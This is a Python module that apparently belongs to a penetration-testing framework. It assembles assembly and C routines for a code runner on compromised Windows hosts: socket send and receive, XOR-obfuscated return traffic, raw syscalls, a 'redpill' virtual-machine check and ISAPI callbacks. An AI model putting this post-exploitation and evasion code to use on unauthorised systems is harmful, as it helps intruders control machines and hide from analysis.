#! /usr/bin/env python

"""
the win32 remote resolver. A kind of combination of libc and a few other things...
"""

MAXCACHESIZE = 1000

from remoteresolver import remoteresolver
import threading
import random
from internal import devlog

class win32remoteresolver(remoteresolver):
    def __init__(self, proc = 'i386', version = None):
        devlog("win32remoteresolver", "Initializing win32remoteresolver")
        if hasattr(self, "fd"):
            devlog("win32remoteresolver", "Warning: reinitializing! Our FD=%s" % self.fd)
        self.isapidict          = {}
        self.arch               = "X86"
        self.functioncache      = {}
        self.localcache         = {}
        self.xorkey             = random.randint(1,250)

        remoteresolver.__init__(self, 'Win32', proc, version)

        self.remoteFunctionsUsed = {}
        self.remotefunctioncache = {}

        self.remotefunctioncache["kernel32.dll|getprocaddress"] = 0x01020304
        self.remotefunctioncache["ws2_32.dll|send"]             = 0x01020304

        return

    def getremote(self,func):
        #this function is actually overridden in win32MosdefShellServer.py
        return 0x01020304

    def initLocalFunctions(self):

        #these functions are helpful when we use callbacks
        #win32api don't restore base when it call us
        self.localfunctions["restore_base"] = ("asm", """
            //first get current getpc
            restore_base:
            call restore_thenew_getpc
            restore_thenew_getpc:
            pop %ebx
            //now substract the difference to base pc
            restore_base_GETPC:
            lea restore_base_GETPC-RESERVED_getpc(%ebx), %eax
            sub %ebx,%eax
            sub %eax,%ebx
            inc %ebx
            ret
        """)

        self.localfunctions["save_regs"] = ("asm", """
            ROOMREGS:
            HOWMUCH
            save_regs:
            push %ecx
            mov %ebx,%ecx
            call restore_base
            lea ROOMREGS-RESERVED_getpc(%ebx), %eax
            //save ebx, esi, edi
            mov %ecx, (%eax)
            pop %ecx
            mov %ecx, 4(%eax)
            mov %edx, 8(%eax)
            mov %esi, 12(%eax)
            mov %edi, 16(%eax)
            ret
            """.replace("HOWMUCH", ".byte 0\n"*(4*5) ) )

        self.localfunctions["restore_regs"] = ("asm", """
            restore_regs:
            lea ROOMREGS-RESERVED_getpc(%ebx), %eax
            mov (%eax), %ebx
            mov 4(%eax), %ecx
            mov 8(%eax), %edx
            mov 12(%eax), %esi
            mov 16(%eax), %edi
            ret
        """)

        self.localfunctions["rawsyscall"] = ("asm", """
            rawsyscall:
            pushl %ebp
            mov %esp, %ebp
            push %edx
            mov 0x8(%ebp), %eax
            mov 0xc(%ebp), %edx
            push %edx
            mov %esp, %edx
            int $0x2e
            add $4, %esp
            pop %edx
            movl %ebp,%esp
            popl %ebp
            ret $8
        """)

        self.localfunctions["checkvm"]=("asm","""
           checkvm:
            xorl %eax, %eax
            subl $6, %esp
            sidt (%esp)
            movb 0x5(%esp), %al
            addl $6, %esp
            andl $0xff, %eax

            // We comment out the comparison logic below because we want to move it
            // to the client (python). We do the test and simply return the value.
            // jge 0xd0, 0xff --> vmware, 0xe8 virtual pc
            // from joanna's redpill thingy
            //     cmpb $0xd0,%al
            //     jg virtualmachine
            //     xorl %eax,%eax
            //  virtualmachine:
            // return value of !zero == virtualmachine
            ret
            """)

        self.localfunctions["callbuf"]=("asm", """
            callbuf:
            pushl %ebp
            movl %esp,%ebp
            pushad
            movl 8(%ebp),%edi
            call %edi
            popad
            movl %ebp,%esp
            popl %ebp
            ret $4
        """)



        self.localfunctions["socket.h"]=("header","""
            struct sockaddr {
                unsigned short int family;
                char data[14];
            };

            struct sockaddr_in {
                unsigned short int family;
                unsigned short int port;
                unsigned int addr;
                char pad[6];
            };
        """)

        self.localfunctions["sendint"]=("c","""
            #import "local", "writeblock2self" as "writeblock2self"
            void sendint(unsigned int myint){
                int i;
                i=myint;
                writeblock2self(&i,4);
            }
        """)

        devlog("win32remoteresolver","Initialized sendint with fd=%s"%self.fd)

        self.localfunctions["sendstring"]=("c","""
            #import "local","strlen" as "strlen"
            #import "local","sendint" as "sendint"
            #import "local","writeblock2self" as "writeblock2self"
            void sendstring(char * instr) {
                sendint(strlen(instr));
                writeblock2self(instr,strlen(instr));
            }
        """)

        self.localfunctions["sendunistring2self"]=("c","""
            #import "remote", "msvcrt.dll|wcslen" as "wcslen"
            #import "local","sendint" as "sendint"
            #import "local","writeblock2self" as "writeblock2self"
            void sendunistring2self(short * instr) {
                int size;
                size=wcslen(instr);
                size=size*2;
                sendint(size);
                writeblock2self(instr,size);
            }
        """)

        self.localfunctions["callvfunction"]=("asm","""
            callvfunction:
                                     // When calling, last 2 args must be *vtable and offset, rest of args will be passed to virtual function.
            movl 0xC(%esp),%ecx     // offset
            movl 0x10(%esp),%edi    // vTable
            movl (%edi), %edx
            jmp (%edx,%ecx)      // Call vFunction

            ret
        """)

        self.localfunctions["debug"]=("asm","""
            debug:
            .byte 0xcc
            ret
        """)

        #
        #end syscalls, begin libc functions
        #

        self.localfunctions["xorblock"]=("c","""
            //xor with a5 for obscurities sake
            int xorblock(char * instr, int size) {
                int i;
                char *p;
                char newbyte;
                char key;

                key=XORKEY;
                i=0;
                p=instr;
                while (i<size) {
                    i=i+1;
                    newbyte=*p;
                    newbyte=newbyte^key;
                    *p=newbyte;
                    p=p+1;
                }
            return i;
            }
        """.replace("XORKEY","%s"%self.xorkey))
        # print "XORKEY=%x"%self.xorkey

        #uses the reliable writeblock
        self.localfunctions["send_array"]=("c","""
            #import "local","writeblock" as "writeblock"
            #import "local","sendint" as "sendint"
            int send_array(int fd, char * outstr,int size) {
                sendint(size);
                writeblock(fd,outstr,size);
            }
        """)

        #uses the reliable writeblock
        self.localfunctions["writestring"]=("c","""
            #import "local","send_array" as "send_array"
            #import "local","strlen" as "strlen"
            int writestring(int fd, char * outstr) {
                send_array(fd,outstr,strlen(outstr));
            }
        """)

        #our reliable reading function
        self.localfunctions["readdata"] = ("c", """
            #import "remote","ws2_32.dll|recv" as "recv"

            int readdata(int fd, char *outstr, int size) {
                int left;
                int i;
                char *p;
                left = size;
                p = outstr;

                while (left > 0) {
                    i = recv(fd, p, left, 0);
                    if (i < 0) {
                        return 0;
                    }
                    left = left - i;
                    p = p + i;
                }

                return 1;
            }
        """)

        if self.isapidict == {}:
            code = """
                #import "local", "readdata" as "readdata"
                int readdatafromself(char *data, int size) {
                    int ret;
                    ret = readdata(FD, data, size);
                    return ret;
                }
                """.replace("FD", str(self.fd))
        else:
            code = """
                #import "remote", "ecb|readclient" as "readclient"

                int readdatafromself(char *data, int size) {
                    int ret;
                    char *p;
                    int readsize;
                    int wanted;

                    readsize = 0;
                    p = data;
                    while (readsize < size) {
                        wanted = size - readsize;
                        ret = readclient(CONTEXT, p, &wanted);
                        readsize = readsize + wanted;
                        p = p + wanted;
                    }

                    return readsize;
                }
                """.replace("CONTEXT",str(self.context))
        self.localfunctions["readdatafromself"] = ("c", code)

        #uses the reliable readdata
        self.localfunctions["readintfromself"]=("c","""
            #import "local","readdatafromself" as "readdatafromself"
            int readintfromself() {
                char buf[4];
                int *p;
                int ret;
                p=buf;
                readdatafromself(buf,4);
                ret=*p; //casting crap
                return ret;
            }
        """)

        #uses the reliable readdata
        self.localfunctions["readstringfromself"]=("c","""
            #import "local","readdatafromself" as "readdatafromself"
            #import "local","readintfromself" as "readintfromself"
            #import "local", "malloc" as "malloc"

            char * readstringfromself() {
                char * buf;
                int size;
                size=readintfromself();
                buf=malloc(size);
                readdatafromself(buf, size);
                return buf;
            }
        """)

        self.localfunctions["malloc"]=("c","""
            #import "remote","kernel32.dll|GlobalAlloc" as "GlobalAlloc"
            char * malloc(int size) {
                char * buf;
                buf=GlobalAlloc(0,size);
                return buf;
            }
        """)

        self.localfunctions["free"]=("c","""
            #import "remote","kernel32.dll|GlobalFree" as "GlobalFree"
            int free(int handle) {
                int ret;
                ret=GlobalFree(handle);
                return ret;
            }
        """)

        #uses the reliable writeblock
        self.localfunctions["sendblock"]=("c","""
            #import "local","writeblock" as "writeblock"
            #import "local","sendint" as "sendint"
            int sendblock(int fd, char * buf, int size) {
                sendint(size);
                writeblock(fd,buf,size);
            }
        """)

        code="""
            #import "local","writeblock2self" as "writeblock2self"
            #import "local","sendint" as "sendint"
            int senddata2self(char * buf, int size) {
                sendint(size);
                writeblock2self(buf,size);
            }
            """
        self.localfunctions["senddata2self"]=("c",code)

        #our reliable writing function
        self.localfunctions["writeblock"]=("c","""
            #import "remote","ws2_32.dll|send" as "send"
            int writeblock(int fd, char * instr,int size) {
                int left;
                int i;
                char * p;
                left=size;
                p=instr;
                while (left > 0) {
                    i=send(fd,p,left,0);
                    if (i<0) {
                        return 0;
                    }
                    left=left-i;
                    p=p+i;
                }
                return 1;
            }
        """)

        if self.isapidict == {}:
            code = """
                 #import "local","writeblock" as "writeblock"
                 #import "local","xorblock" as "xorblock"
                 int writeblock2self(char * buf, int size) {
                    xorblock(buf,size);
                    writeblock(FD,buf,size);
                    xorblock(buf,size); //restore
                 }
                 """
            code = code.replace("FD",str(int(self.fd)))
            devlog("win32remoteresolver", "writeblock2self compiled with fd=%s"%self.fd)
        else:
            print "Using ISAPI code in win32 remoteresolver"
            code="""
                #import "remote","ecb|writeclient" as "writeclient"
                #import "local","xorblock" as "xorblock"
                int writeblock2self(char * buf, int size) {
                    int newsize;
                    int sentsize;
                    sentsize=0;
                    xorblock(buf,size);
                    while (sentsize<size) {
                        newsize=size-sentsize;
                        writeclient(CONNID,buf,&newsize);
                        sentsize=sentsize+newsize;
                    }
                    xorblock(buf,size); //restore
                }
                """.replace("CONNID",str(int(self.context)))


        self.localfunctions["writeblock2self"]=("c",code)


        self.localfunctions["sendshort"]=("c","""
            #import "local","writeblock2self" as "writeblock2self"
            void sendshort(short tosend)
            {
                short i;
                i=tosend;
                writeblock2self(&i,2);
            }
        """)

    def getRemoteFunctionCached(self,function):
        if function in self.remoteFunctionsUsed.keys():
            return 1
        return 0

    def addToRemoteFunctionCache(self,function):
        self.remoteFunctionsUsed[function] = 1
        return

    def savefunctioncache(self):
        self.sfunctioncache = (self.functioncache,self.remoteFunctionsUsed)

    def restorefunctioncache(self):
        (self.functioncache,self.remoteFunctionsUsed)=self.sfunctioncache

    def clearfunctioncache(self):
        self.remoteFunctionsUsed = {}
        remoteresolver.clearfunctioncache(self)
        return

if __name__=="__main__":
    w=win32remoteresolver()
